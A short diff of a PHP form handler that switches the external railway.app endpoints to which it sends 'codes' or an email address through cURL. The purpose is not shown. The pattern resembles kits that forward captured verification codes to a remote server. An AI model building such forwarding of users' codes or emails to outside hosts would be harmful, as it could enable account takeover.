@@ -19,10 +19,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_SESSION['vlidatePage'])) {
         unset($_SESSION['vlidatePage']);
     }
-    $ch = curl_init('https://spike-production.up.railway.app/sendCodes');
+    $ch = curl_init('https://spike-production-453f.up.railway.app/sendCodes');
     if (strlen($correo) > 6) {
 
-        $ch = curl_init('https://spike-production.up.railway.app/sendCorreo');
+        $ch = curl_init('https://spike-production-453f.up.railway.app/sendCorreo');
     }
     // Configurar cURL
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
